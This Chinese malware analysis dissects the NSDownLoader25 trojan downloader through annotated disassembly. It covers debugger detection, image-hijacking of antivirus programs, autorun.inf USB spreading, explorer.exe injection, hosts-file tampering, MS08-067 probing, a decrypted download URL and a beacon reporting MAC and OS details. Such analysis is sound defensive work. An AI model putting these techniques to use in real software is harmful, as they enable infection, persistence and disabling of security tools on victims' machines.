
# `NSDownLoader25 Vip20081130` 分析

> 原文：[`www.pediy.com/kssd/pediy10/78573.html`](https://www.pediy.com/kssd/pediy10/78573.html)

病毒行为描述：释放文件，修改时间，映像劫持，利用 `ARP` 攻击在局域网传播，攻击没有修补 `MS08-067` 号漏洞的 `Windows` 系统，利用 `U` 盘自动运行功能传播，修改 `hosts` 文件等等。

代码:



## 1、比较当前进程是不是 `svchost.exe`

```asm
.text:71001394              lea     eax, [ebp+eax+String]
.text:7100139B              push    offset Data     ; "svchost.exe"
.text:710013A0              push    eax             ; lpString
.text:710013A1              call    sub_7100148D    ; 比较当前进程是不是 svchost.exe
```

## 2、释放驱动

```asm
.text:710013AB              jz      short loc_710013BA
.text:710013AD              call    CreateFileA_0   ; 驱动
.text:710013B2              push    esi
```

## 3、将时间修改为 `svchost.exe` 时间

```asm
.text:710013B3              call    sub_71002501    ; svchost.exe 时间
.text:710013B8              jmp     short loc_710013C9
.text:710013BA ; ---------------------------------------------------------------------------
```

## 4、创建线程

```asm
.text:710013BA loc_710013BA:                     ; CODE XREF: DllEntryPoint+65j
.text:710013BA              push    esi             ; dwCreationFlags
.text:710013BB              push    esi             ; lpParameter
.text:710013BC              push    offset CreateThread_1 ; lpStartAddress
.text:710013C1              push    esi             ; dwStackSize
.text:710013C2              push    esi             ; lpThreadAttributes
.text:710013C3              call    ds:CreateThread
```

## 5、遍历进程

```asm
.text:710010A4              push    eax             ; int
.text:710010A5              push    offset aOllydbg_exe ; "OllyDbg.exe"
.text:710010AA              call    sub_7100148D
.text:710010AF              test    eax, eax
.text:710010B1              pop     ecx
.text:710010B2              pop     ecx
.text:710010B3              jz      loc_7100114D
.text:710010B9              lea     eax, [ebp+78h+pe.szExeFile]
.text:710010BF              push    eax             ; int
.text:710010C0              push    offset aOllyice_exe ; "OllyICE.exe"
.text:710010C5              call    sub_7100148D
.text:710010CA              test    eax, eax
.text:710010CC              pop     ecx
.text:710010CD              pop     ecx
.text:710010CE              jz      short loc_7100114D
.text:710010D0              lea     eax, [ebp+78h+pe.szExeFile]
.text:710010D6              push    eax             ; int
.text:710010D7              push    offset aPeditor_exe ; "PEditor.exe"
.text:710010DC              call    sub_7100148D
.text:710010E1              test    eax, eax
.text:710010E3              pop     ecx
.text:710010E4              pop     ecx
.text:710010E5              jz      short loc_7100114D
.text:710010E7              lea     eax, [ebp+78h+pe.szExeFile]
.text:710010ED              push    eax             ; int
.text:710010EE              push    offset aLordpe_exe ; "LordPE.exe"
.text:710010F3              call    sub_7100148D
.text:710010F8              test    eax, eax
.text:710010FA              pop     ecx
.text:710010FB              pop     ecx
.text:710010FC              jz      short loc_7100114D
.text:710010FE              lea     eax, [ebp+78h+pe.szExeFile]
.text:71001104              push    eax             ; int
.text:71001105              push    offset aC32asm_exe ; "C32Asm.exe"
.text:7100110A              call    sub_7100148D
.text:7100110F              test    eax, eax
.text:71001111              pop     ecx
.text:71001112              pop     ecx
.text:71001113              jz      short loc_7100114D
.text:71001115              lea     eax, [ebp+78h+pe.szExeFile]
.text:7100111B              push    eax             ; int
.text:7100111C              push    offset aImportrec_exe ; "ImportREC.exe"
.text:71001121              call    sub_7100148D
.text:71001126              test    eax, eax
.text:71001128              pop     ecx
.text:71001129              pop     ecx
```

## 6、映像劫持

```asm
.text:71001C4B              push    esi             ; ulOptions
.text:71001C4C              push    offset SubKey   ; SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution  Options
.text:71001C51              push    80000002h       ; hKey
.text:71001C56              call    ds:RegOpenKeyExA
.text:71001C5C              push    offset aSleep   ; "Sleep"
.text:71001C61              push    offset LibFileName ; "kernel32.dll"
.text:71001C66              call    ds:LoadLibraryW
.text:71001C6C              push    eax             ; hModule
.text:71001C6D              call    ds:GetProcAddress
.text:71001C73              mov     ebx, ds:RegCreateKeyExA
.text:71001C79              mov     ebp, ds:RegSetValueExA
.text:71001C7F              mov     [esp+20h+var_4], eax
.text:71001C83
.text:71001C83 loc_71001C83:                     ; CODE XREF: IFEO+E4j
.text:71001C83              push    esi             ; lpdwDisposition
.text:71001C84              lea     eax, [esp+24h+phkResult]
.text:71001C88              push    eax             ; phkResult
.text:71001C89              push    esi             ; lpSecurityAttributes
.text:71001C8A              push    edi             ; samDesired
.text:71001C8B              push    esi             ; dwOptions
.text:71001C8C              push    esi             ; lpClass
.text:71001C8D              push    esi             ; Reserved
.text:71001C8E              push    offset aAvp_exe ; "avp.exe"
.text:71001C93              push    [esp+40h+hKey]  ; hKey
.text:71001C97              mov     [esp+44h+phkResult], esi
.text:71001C9B              call    ebx ; RegCreateKeyExA
.text:71001C9D              push    0Ch             ; cbData
.text:71001C9F              push    offset Data     ; "svchost.exe"
.text:71001CA4              push    1               ; dwType
.text:71001CA6              push    esi             ; Reserved
.text:71001CA7              push    offset ValueName ; "Debugger"
.text:71001CAC              push    [esp+34h+phkResult] ; hKey
.text:71001CB0              call    ebp ; RegSetValueExA
.text:71001CB2              push    [esp+20h+phkResult] ; hKey
.text:71001CB6              call    ds:RegCloseKey
.text:71001CBC              mov     eax, lpSubKey
.text:71001CC1              cmp     eax, esi
.text:71001CC3              jz      short loc_71001D0D
.text:71001CC5              mov     [esp+20h+var_8], offset lpSubKey
.text:71001CCD
.text:71001CCD loc_71001CCD:                     ; CODE XREF: IFEO+D9j
.text:71001CCD              push    esi             ; lpdwDisposition
.text:71001CCE              lea     ecx, [esp+24h+phkResult]
.text:71001CD2              push    ecx             ; phkResult
.text:71001CD3              push    esi             ; lpSecurityAttributes
.text:71001CD4              push    edi             ; samDesired
.text:71001CD5              push    esi             ; dwOptions
.text:71001CD6              push    esi             ; lpClass
.text:71001CD7              push    esi             ; Reserved
.text:71001CD8              push    eax             ; lpSubKey
.text:71001CD9              push    [esp+40h+hKey]  ; hKey
.text:71001CDD              call    ebx ; RegCreateKeyExA
.text:71001CDF              push    0Ch             ; cbData
.text:71001CE1              push    offset Data     ; "svchost.exe"
.text:71001CE6              push    1               ; dwType
.text:71001CE8              push    esi             ; Reserved
.text:71001CE9              push    offset ValueName ; "Debugger"
.text:71001CEE              push    [esp+34h+phkResult] ; hKey
.text:71001CF2              call    ebp ; RegSetValueExA
.text:71001CF4              push    [esp+20h+phkResult] ; hKey
.text:71001CF8              call    ds:RegCloseKey
```

## 7、提权

```asm
.text:71001B89              mov     ebp, offset aSesecuritypriv ; "SeSecurityPrivilege"
.text:71001B8E              push    ebp             ; lpName
.text:71001B8F              call    tiquan          ; 提权
.text:71001B94              pop     ecx
```

## 8、受影响版本、`SendARP`、机器信息

```asm
.text:71003ABB              push    80h
.text:71003AC0              push    eax             ; lpString1
.text:71003AC1              call    GetVersionExA_0 ; 受影响版本

.text:71003AD4              push    eax
.text:71003AD5              call    sub_710038DB    ; SendARP
.text:71003ADA              push    1Fh

.text:71003B0F              lea     eax, [ebp+74h+var_8C]
.text:71003B12              push    offset a_2x_2x_2x_2x_2 ; "%.2X-%.2X-%.2X-%.2X-%.2X-%.2X"
.text:71003B17              push    eax             ; LPSTR
.text:71003B18              call    ebx ; wsprintfA
.text:71003B1A              mov     [ebp+74h+var_314], 0
.text:71003B21              push    40h
.text:71003B23              xor     eax, eax
.text:71003B25              pop     ecx
.text:71003B26              lea     edi, [ebp+74h+var_313]
.text:71003B2C              rep stosd
.text:71003B2E              stosw
.text:71003B30              stosb
.text:71003B31              mov     eax, dword_71008120
.text:71003B36              mov     ecx, eax
.text:71003B38              mov     edx, ecx
.text:71003B3A              shr     ecx, 2
.text:71003B3D              mov     esi, offset unk_710080A0
.text:71003B42              lea     edi, [ebp+74h+var_314]
.text:71003B48              rep movsd
.text:71003B4A              push    eax
.text:71003B4B              mov     ecx, edx
.text:71003B4D              lea     eax, [ebp+74h+var_314]
.text:71003B53              and     ecx, 3
.text:71003B56              push    eax
.text:71003B57              rep movsb
.text:71003B59              call    sub_710013D1
.text:71003B5E              add     esp, 34h
.text:71003B61              push    offset aUrldownloadtof ; "URLDownloadToFileA"
.text:71003B66              push    offset aUrlmon_dll ; "Urlmon.dll"
.text:71003B6B              call    ds:LoadLibraryW
.text:71003B71              push    eax             ; hModule
.text:71003B72              call    ds:GetProcAddress
.text:71003B78              test    eax, eax
.text:71003B7A              mov     [ebp+74h+var_8], eax
.text:71003B7D              jz      loc_71003C35
.text:71003B83              mov     esi, ds:GetTickCount
.text:71003B89              push    7Fh
.text:71003B8B              mov     [ebp+74h+var_514], 0
.text:71003B92              xor     eax, eax
.text:71003B94              pop     ecx
.text:71003B95              lea     edi, [ebp+74h+var_513]
.text:71003B9B              rep stosd
.text:71003B9D              stosw
.text:71003B9F              stosb
.text:71003BA0              call    esi ; GetTickCount
.text:71003BA2              mov     edi, eax
.text:71003BA4              lea     eax, [ebp+74h+var_8C]
.text:71003BA7              push    edi
.text:71003BA8              push    eax
.text:71003BA9              call    sub_710038A9
.text:71003BAE              push    eax
.text:71003BAF              push    edi
.text:71003BB0              lea     eax, [ebp+74h+String1]
.text:71003BB6              push    eax
.text:71003BB7              lea     eax, [ebp+74h+var_8C]
.text:71003BBA              push    eax
.text:71003BBB              lea     eax, [ebp+74h+var_314]
.text:71003BC1              push    eax
.text:71003BC2              lea     eax, [ebp+74h+var_514]
.text:71003BC8              push    offset aS?macSOsSVer2_ ; "%s?mac=%s&os=%s&ver=2.5.1130&temp=%d&ke"...
.text:71003BCD              push    eax             ; LPSTR
.text:71003BCE              call    ebx ; wsprintfA
.text:71003BD0              add     esp, 24h
.text:71003BD3              push    40h
.text:71003BD5              pop     ecx
.text:71003BD6              xor     eax, eax
.text:71003BD8              mov     [ebp+74h+Buffer], 0
.text:71003BDF              lea     edi, [ebp+74h+var_20F]
.text:71003BE5              rep stosd
.text:71003BE7              stosw
.text:71003BE9              stosb
.text:71003BEA              lea     eax, [ebp+74h+Buffer]
.text:71003BF0              push    eax             ; lpBuffer
.text:71003BF1              push    104h            ; nBufferLength
.text:71003BF6              call    ds:GetTempPathA
.text:71003BFC              call    esi ; GetTickCount
.text:71003BFE              push    eax
.text:71003BFF              lea     eax, [ebp+74h+Buffer]
.text:71003C05              push    eax
.text:71003C06              push    offset aSD_txt  ; "%s%d.txt"
.text:71003C0B              push    eax             ; LPSTR
.text:71003C0C              call    ebx ; wsprintfA
```

## 9、下载者：`http://biao.djdj4455.cn/number/list.txt`

```asm
.text:710022EB              push    dword_7100809C
.text:710022F1              mov     esi, offset asc_7100801C ; "!构"
.text:710022F6              push    esi
.text:710022F7              call    sub_710013D1    ; 解密 call
.text:710022F7                                       ; http://biao.djdj4455.cn/number/list.txt
.text:710022FC              pop     ecx
```

## 10、`Autorun`

```asm
.text:71003F07              push    edi
.text:71003F08              mov     ebp, offset aExplore ; "explore"
.text:71003F0D              mov     esi, offset aSystem_dll ; "system.dll"
.text:71003F12
.text:71003F12 loc_71003F12:                     ; CODE XREF: autorun+1CAj
.text:71003F12              lea     eax, [esp+734h+Buffer]
.text:71003F19              push    eax             ; lpBuffer
.text:71003F1A              push    104h            ; nBufferLength
.text:71003F1F              call    ds:GetLogicalDriveStringsA
.text:71003F25              lea     eax, [esp+734h+Buffer]
.text:71003F2C              mov     [esp+734h+lpString], eax
.text:71003F30              lea     eax, [esp+734h+lpString]
.text:71003F34              push    eax             ; int
.text:71003F35              lea     eax, [esp+738h+Buffer]
.text:71003F3C              push    eax             ; lpString
.text:71003F3D              call    sub_71003E11
.text:71003F42              mov     edi, eax
.text:71003F44              test    edi, edi
.text:71003F46              pop     ecx
.text:71003F47              pop     ecx
.text:71003F48              mov     [esp+734h+lpString2], edi
.text:71003F4C              jz      loc_710040BD
.text:71003F52              jmp     short loc_71003F58
.text:71003F54 ; ---------------------------------------------------------------------------
.text:71003F54
.text:71003F54 loc_71003F54:                     ; CODE XREF: autorun+1B9j
.text:71003F54              mov     edi, [esp+734h+lpString2]
.text:71003F58
.text:71003F58 loc_71003F58:                     ; CODE XREF: autorun+54j
.text:71003F58              push    edi             ; lpRootPathName
.text:71003F59              call    ds:GetDriveTypeA
.text:71003F5F              mov     ebx, ds:lstrcmpiA
.text:71003F65              push    offset aA       ; "A:\\"
.text:71003F6A              push    edi             ; lpString1
.text:71003F6B              mov     [esp+73Ch+var_71C], eax
.text:71003F6F              call    ebx ; lstrcmpiA
.text:71003F71              test    eax, eax
.text:71003F73              jz      loc_710040A1
.text:71003F79              push    offset aB       ; "B:\\"
.text:71003F7E              push    edi             ; lpString1
.text:71003F7F              call    ebx ; lstrcmpiA
.text:71003F81              test    eax, eax
.text:71003F83              jz      loc_710040A1
.text:71003F89              mov     eax, [esp+734h+var_71C]
.text:71003F8D              cmp     eax, dword_7100800C
.text:71003F93              jz      short loc_71003FA1
.text:71003F95              cmp     eax, dword_71008010
.text:71003F9B              jnz     loc_710040A1
.text:71003FA1
.text:71003FA1 loc_71003FA1:                     ; CODE XREF: autorun+95j
.text:71003FA1              push    offset aAutorun ; "autorun"
.text:71003FA6              push    edi
.text:71003FA7              lea     eax, [esp+73Ch+FileName]
.text:71003FAB              push    offset aSS_inf  ; "%s%s.inf"
.text:71003FB0              push    eax             ; LPSTR
.text:71003FB1              call    ds:wsprintfA
.text:71003FB7              add     esp, 10h
.text:71003FBA              push    6               ; dwFileAttributes
.text:71003FBC              lea     eax, [esp+738h+FileName]
.text:71003FC0              push    eax             ; lpFileName
.text:71003FC1              call    ds:SetFileAttributesA
.text:71003FC7              lea     eax, [esp+734h+FileName]
.text:71003FCB              push    eax             ; lpPathName
.text:71003FCC              call    ds:RemoveDirectoryA
.text:71003FD2              push    0               ; hTemplateFile
.text:71003FD4              push    6               ; dwFlagsAndAttributes
.text:71003FD6              push    4               ; dwCreationDisposition
.text:71003FD8              push    0               ; lpSecurityAttributes
.text:71003FDA              push    7               ; dwShareMode
.text:71003FDC              push    0C0000000h      ; dwDesiredAccess
.text:71003FE1              lea     eax, [esp+74Ch+FileName]
.text:71003FE5              push    eax             ; lpFileName
.text:71003FE6              call    ds:CreateFileA
.text:71003FEC              mov     ebx, eax
.text:71003FEE              xor     eax, eax
.text:71003FF0              mov     [esp+734h+String], 0
.text:71003FF8              mov     ecx, 0FFh
.text:71003FFD              lea     edi, [esp+734h+var_3FF]
.text:71004004              rep stosd
.text:71004006              push    ebp
.text:71004007              push    esi
.text:71004008              stosw
.text:7100400A              stosb
.text:7100400B              mov     eax, offset aCommandRundll3 ; "command=rundll32"
.text:71004010              push    eax
.text:71004011              push    ebp
.text:71004012              mov     ecx, offset aShell ; "shell"
.text:71004017              push    ecx
.text:71004018              push    ebp
.text:71004019              push    esi
.text:7100401A              push    eax
.text:7100401B              push    ecx
.text:7100401C              push    offset aAutorun ; "autorun"
.text:71004021              lea     eax, [esp+75Ch+String]
.text:71004028              push    offset aSSOpenSSSSSSSSS ; "[%s]\r\n%s\\open\\%s %s,%s\r\n%s\\%s\\%s %s,%s"
.text:7100402D              push    eax             ; LPSTR
.text:7100402E              call    ds:wsprintfA
.text:71004034              add     esp, 30h
.text:71004037              lea     eax, [esp+734h+String]
.text:7100403E              push    eax             ; lpString
.text:7100403F              call    ds:lstrlenA
.text:71004045              push    0               ; lpOverlapped
.text:71004047              lea     ecx, [esp+738h+NumberOfBytesWritten]
.text:7100404B              push    ecx             ; lpNumberOfBytesWritten
.text:7100404C              inc     eax
.text:7100404D              push    eax             ; nNumberOfBytesToWrite
.text:7100404E              lea     eax, [esp+740h+String]
.text:71004055              push    eax             ; lpBuffer
.text:71004056              push    ebx             ; hFile
.text:71004057              call    ds:WriteFile
.text:7100405D              push    ebx             ; hFile
.text:7100405E              call    ds:SetEndOfFile
.text:71004064              push    ebx             ; hFile
.text:71004065              call    ds:FlushFileBuffers
.text:7100406B              push    ebx             ; hObject
.text:7100406C              call    ds:CloseHandle
.text:71004072              push    [esp+734h+lpString2] ; lpString2
.text:71004076              lea     eax, [esp+738h+String1]
.text:7100407D              push    eax             ; lpString1
.text:7100407E              call    ds:lstrcpyA
.text:71004084              push    esi             ; lpString2
.text:71004085              lea     eax, [esp+738h+String1]
.text:7100408C              push    eax             ; lpString1
.text:7100408D              call    ds:lstrcatA
.text:71004093              lea     eax, [esp+734h+String1]
.text:7100409A              push    eax             ; lpFileName
.text:7100409B              call    sub_71003E6E
.text:710040A0              pop     ecx
.text:710040A1
.text:710040A1 loc_710040A1:                     ; CODE XREF: autorun+75j
.text:710040A1                                       ; autorun+85j ...
.text:710040A1              lea     eax, [esp+734h+lpString]
.text:710040A5              push    eax             ; int
.text:710040A6              push    [esp+738h+lpString] ; lpString
.text:710040AA              call    sub_71003E11
.text:710040AF              test    eax, eax
.text:710040B1              pop     ecx
.text:710040B2              pop     ecx
.text:710040B3              mov     [esp+734h+lpString2], eax
.text:710040B7              jnz     loc_71003F54
.text:710040BD
.text:710040BD loc_710040BD:                     ; CODE XREF: autorun+4Ej
.text:710040BD              push    2710h           ; dwMilliseconds
.text:710040C2              call    ds:Sleep
```

## 11、注入

```asm
.text:71003D8C              call    ds:GetSystemDirectoryA
.text:71003D92              push    offset aAppwinproc_dll ; "\\appwinproc.dll"
.text:71003D97              lea     eax, [ebp+Buffer]
.text:71003D9D              push    eax             ; lpString1
.text:71003D9E              call    ds:lstrcatA
.text:71003DA4              lea     eax, [ebp+Buffer]
.text:71003DAA              push    eax             ; lpFileName
.text:71003DAB              push    69h             ; nNumberOfBytesToWrite
.text:71003DAD              push    offset Type     ; "RES"
.text:71003DB2              push    hModule         ; hModule
.text:71003DB8              call    sub_71003558
.text:71003DBD              add     esp, 10h
.text:71003DC0
.text:71003DC0 loc_71003DC0:                     ; CODE XREF: inject+7Dj
.text:71003DC0              push    offset aExplorer_exe ; "explorer.exe"
.text:71003DC5              call    sub_710014EE
.text:71003DCA              mov     esi, eax
.text:71003DCC              mov     [esp+110h+var_110], 2710h
.text:71003DD3              call    ds:Sleep
.text:71003DD9              test    esi, esi
.text:71003DDB              jz      short loc_71003DC0
.text:71003DDD              push    esi             ; dwProcessId
.text:71003DDE              push    0               ; bInheritHandle
.text:71003DE0              push    10043Ah         ; dwDesiredAccess
.text:71003DE5              call    ds:OpenProcess
.text:71003DEB              mov     esi, eax
.text:71003DED              test    esi, esi
.text:71003DEF              jz      loc_71003D69
.text:71003DF5              lea     eax, [ebp+Buffer]
.text:71003DFB              push    eax             ; lpBuffer
.text:71003DFC              push    esi             ; hProcess
.text:71003DFD              call    sub_71002474
.text:71003E02              push    0FFFFFFFFh      ; dwMilliseconds
.text:71003E04              push    esi             ; hHandle
.text:71003E05              call    ds:WaitForSingleObject
.text:71003E0B              jmp     loc_71003D69
```

## 12、修改 `hosts` 文件

```asm
.text:710040FD              call    ds:GetSystemDirectoryA
.text:71004103              push    offset aDriversEtcHost ; "\\drivers\\etc\\hosts"
.text:71004108              lea     eax, [ebp+FileName]
.text:7100410E              push    eax             ; lpString1
.text:7100410F              call    ds:lstrcatA
.text:71004115              mov     esi, 80h
.text:7100411A              push    esi             ; dwFileAttributes
.text:7100411B              lea     eax, [ebp+FileName]
.text:71004121              push    eax             ; lpFileName
.text:71004122              call    ds:SetFileAttributesA
.text:71004128              push    ebx             ; hTemplateFile
.text:71004129              push    esi             ; dwFlagsAndAttributes
.text:7100412A              push    4               ; dwCreationDisposition
.text:7100412C              push    ebx             ; lpSecurityAttributes
.text:7100412D              push    1               ; dwShareMode
.text:7100412F              push    40000000h       ; dwDesiredAccess
.text:71004134              lea     eax, [ebp+FileName]
.text:7100413A              push    eax             ; lpFileName
.text:7100413B              call    ds:CreateFileA
.text:71004141              mov     edi, eax
.text:71004143
.text:71004143 loc_71004143:                     ; CODE XREF: modifly_hosts+E0j
.text:71004143              push    ebx             ; dwMoveMethod
.text:71004144              push    ebx             ; lpDistanceToMoveHigh
.text:71004145              push    ebx             ; lDistanceToMove
.text:71004146              push    edi             ; hFile
.text:71004147              call    ds:SetFilePointer
.text:7100414D              mov     eax, off_71008430
.text:71004152              cmp     eax, ebx
.text:71004154              jz      short loc_7100419B
.text:71004156              mov     esi, offset off_71008430
.text:7100415B
.text:7100415B loc_7100415B:                     ; CODE XREF: modifly_hosts+CCj
.text:7100415B              push    eax
.text:7100415C              lea     eax, [ebp+String]
.text:71004162              push    offset a127_0_0_1S ; "127.0.0.1 %s\r\n"
.text:71004167              push    eax             ; LPSTR
.text:71004168              call    ds:wsprintfA
.text:7100416E              add     esp, 0Ch
.text:71004171              push    ebx             ; lpOverlapped
.text:71004172              lea     eax, [ebp+NumberOfBytesWritten]
.text:71004175              push    eax             ; lpNumberOfBytesWritten
.text:71004176              lea     eax, [ebp+String]
.text:7100417C              push    eax             ; lpString
.text:7100417D              call    ds:lstrlenA
.text:71004183              push    eax             ; nNumberOfBytesToWrite
.text:71004184              lea     eax, [ebp+String]
.text:7100418A              push    eax             ; lpBuffer
.text:7100418B              push    edi             ; hFile
.text:7100418C              call    ds:WriteFile
.text:71004192              add     esi, 4
.text:71004195              mov     eax, [esi]
.text:71004197              cmp     eax, ebx
.text:71004199              jnz     short loc_7100415B
.text:7100419B
.text:7100419B loc_7100419B:                     ; CODE XREF: modifly_hosts+87j
.text:7100419B              push    edi             ; hFile
.text:7100419C              call    ds:SetEndOfFile
.text:710041A2              push    7530h           ; dwMilliseconds
.text:710041A7              call    ds:Sleep
```

## 13、利用 `ms0867` 漏洞

```asm
.text:71001E12              push    offset aMs0867  ; "Ms0867"
.text:71001E17              lea     eax, [ebx+84h]
.text:71001E1D              push    eax             ; lpLibFileName
.text:71001E1E              mov     byte ptr [ebp+arg_0+3], 1
.text:71001E22              call    ds:LoadLibraryA
.text:71001E28              push    eax             ; hModule
.text:71001E29              call    ds:GetProcAddress
.text:71001E2F              test    eax, eax
.text:71001E31              mov     dword ptr [ebp+name.sa_data+2], eax
.text:71001E34              jz      short loc_71001EB0
.text:71001E36              push    esi
.text:71001E37              push    edi
.text:71001E38              mov     esi, offset CriticalSection
.text:71001E3D
.text:71001E3D loc_71001E3D:                     ; CODE XREF: sub_71001DFC+B0j
.text:71001E3D              push    esi             ; lpCriticalSection
.text:71001E3E              call    ds:EnterCriticalSection
.text:71001E44              lea     eax, [ebx+4]
.text:71001E47              push    eax
.text:71001E48              call    dword ptr [ebp+name.sa_data+2]
.text:71001E4B              push    esi             ; lpCriticalSection
.text:71001E4C              mov     edi, eax
.text:71001E4E              call    ds:LeaveCriticalSection
.text:71001E54              test    edi, edi
.text:71001E56              jz      short loc_71001EA5
.text:71001E58              push    0               ; protocol
.text:71001E5A              push    1               ; type
.text:71001E5C              push    2               ; af
.text:71001E5E              call    socket
.text:71001E63              push    115Ch           ; hostshort
.text:71001E68              mov     dword ptr [ebp+name.sa_data+6], eax
.text:71001E6B              call    htons
.text:71001E70              push    10h             ; namelen
.text:71001E72              lea     eax, [ebp+name]
.text:71001E75              push    eax             ; name
.text:71001E76              push    dword ptr [ebp+name.sa_data+6] ; s
.text:71001E79              call    connect
.text:71001E7E              cmp     eax, 0FFFFFFFFh
.text:71001E81              jz      short loc_71001E9D
.text:71001E83              mov     edi, [ebx]
.text:71001E85              push    edi             ; lpString
.text:71001E86              call    ds:lstrlenA
.text:71001E8C              push    0               ; flags
.text:71001E8E              push    eax             ; len
.text:71001E8F              push    edi             ; buf
.text:71001E90              push    dword ptr [ebp+name.sa_data+6] ; s
.text:71001E93              call    send
.text:71001E98              cmp     eax, 0FFFFFFFFh
.text:71001E9B              jnz     short loc_71001EA5
.text:71001E9D
.text:71001E9D loc_71001E9D:                     ; CODE XREF: sub_71001DFC+85j
.text:71001E9D              push    dword ptr [ebp+name.sa_data+6] ; s
.text:71001EA0              call    closesocket
.text:71001EA5
.text:71001EA5 loc_71001EA5:                     ; CODE XREF: sub_71001DFC+5Aj
.text:71001EA5                                       ; sub_71001DFC+9Fj
.text:71001EA5              inc     byte ptr [ebp+arg_0+3]
.text:71001EA8              cmp     byte ptr [ebp+arg_0+3], 0FEh
.text:71001EAC              jbe     short loc_71001E3D
.text:71001EAE              pop     edi
.text:71001EAF              pop     esi
```

## 14、释放驱动

```asm
push    offset NsPass_d_sys ; lpStartAddress
call    CreateThread_0
```

## 15、`appwinproc.dll` 主要是 kill AV

```asm
.data:10003004              dd offset aMcafee       ; "McAfee"
.data:10003008              dd offset aMP           ; "超级巡警"
.data:1000300C              dd offset a360L         ; "360 安全卫士"
.data:10003010              dd offset aCV           ; "奇虎"
.data:10003014              dd offset unk_10002074
.data:10003018              dd offset asc_1000206C  ; "杀毒"
.data:1000301C              dd offset aA            ; "木马"
.data:10003020              dd offset aI            ; "专杀"
.data:10003024              dd offset asc_10002054  ; "下载者"
.data:10003028              dd offset unk_10002048
.data:1000302C              dd offset aNod32        ; "NOD32"
.data:10003030              dd offset unk_10002034
.data:10003034              dd offset unk_10002028
```
